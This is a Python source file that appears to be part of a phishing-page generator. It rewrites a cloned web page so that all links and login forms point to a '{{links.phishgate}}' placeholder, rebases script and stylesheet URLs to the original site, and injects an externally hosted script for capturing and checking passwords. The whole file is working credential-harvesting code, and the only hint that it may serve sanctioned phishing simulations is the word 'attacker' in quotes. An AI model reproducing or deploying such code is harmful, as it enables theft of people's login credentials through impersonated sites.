import re #Used for RegEx
from BeautifulSoup import BeautifulSoup #For parsing HTML
import urlparse #For joining URLs, required for <a>, <link>, and <script> tags

encoding = 'utf-8'

#This is Step 1 - URLs are replaced with our phishing URLs and new text is saved to output file
def replaceURL(URL,OUTPUT):
	#Provide user feedback
	print "[+] Replacing the URLs in the HTML source."
	print "[+] URLs that will be replaced:"
	#Open source, read lines, and begin parsing to replace all URLs for scripts and links
	try:
		#Print href URLs that will be replaced
		print "\n".join(re.findall('<a href="?\'?([^"\'>]*)', open(OUTPUT).read()))
		with open(OUTPUT, "r") as html:
			#Read in the source html and parse with BeautifulSoup
			soup = BeautifulSoup(html)
			#Find all links and replace URLs with our new text/URLs
			for link in soup.findAll('a', href=True):
				link['href'] = '{{links.phishgate}}'
			for link in soup.findAll('link', href=True):
				link['href'] = urlparse.urljoin(URL, link['href'])
			for link in soup.findAll('script', src=True):
				link['src'] = urlparse.urljoin(URL, link['src'])
			source = str(soup.prettify(encoding=encoding))
			#Write the updated URLs to output file while removing the [' and ']
			output = open(OUTPUT, "w")
			output.write(source.replace('[','').replace(']',''))
			output.close()
			print "[+] URL parsing successful. All URLs have been replaced."
	except:
		print "[-] URL parsing failed. Make sure the html file exists and is readable."

#This is Step 2 - Insert JavaScript for login form password dtripping and evaluation.
#This is done after replaceURL() or else the JavScript URL will be edited
def insertPwdEval(OUTPUT):
	strJSLogin = '<script type="text/javascript" src="JAVASCRIPT_LINK"></script>' #Replace src with real URL for hosted checkForm.js
	print "[+] Inserting password JavaScript."
	try:
		with open(OUTPUT, "r") as html:
			#Read in the source html and parse with BeautifulSoup
			source = html.read()
			index = source.find(r"</html")
			print "[+] Closing HTML tag found at index " + str(index)
			javascript = source[:index] + strJSLogin + source[index:]
			soup = BeautifulSoup(javascript.replace('[','').replace(']',''))
			output = open(OUTPUT, "w")
			output.write(soup.prettify(encoding=encoding))
			output.close()
			print "[+] JavaScript has been inserted."
	except:
		#Exception may occur if file doesn't exist or can't be read/written to
		print "[-] Failed to insert JavaScript. Make sure the html file exists and is readable."

#This is Step 3 - Form actions are changed to redirect POST to the 'attacker'
def fixForms(OUTPUT):
	#Provide user feedback
	print "[+] Finding forms to edit."
	print "[+] RegEx matches:"
	#Open output file, read lines, and begin parsing to replace all incomplete img src URLs
	try:
		with open(OUTPUT, "r") as html:
			#Read in the source html and parse with BeautifulSoup
			soup = BeautifulSoup(html)
			#Find all <form> with action attribute and replace it
			for form in soup.findAll('form'):
				form['action'] = "{{links.phishgate}}"
				#form['method'] = "post"
				#form['onsubmit'] = "return checkForm(this);"
			source = str(soup.prettify(encoding=encoding))
			#Write the updated form to output file while removing the [' and ']
			output = open(OUTPUT, "w")
			output.write(source.replace('[','').replace(']',''))
			output.close()
			print "[+] Form parsing successful."
	except:
		#Exception may occur if file doesn't exist or can't be read/written to
		print "[-] Form parsing failed. Make sure the html file exists and is readable."
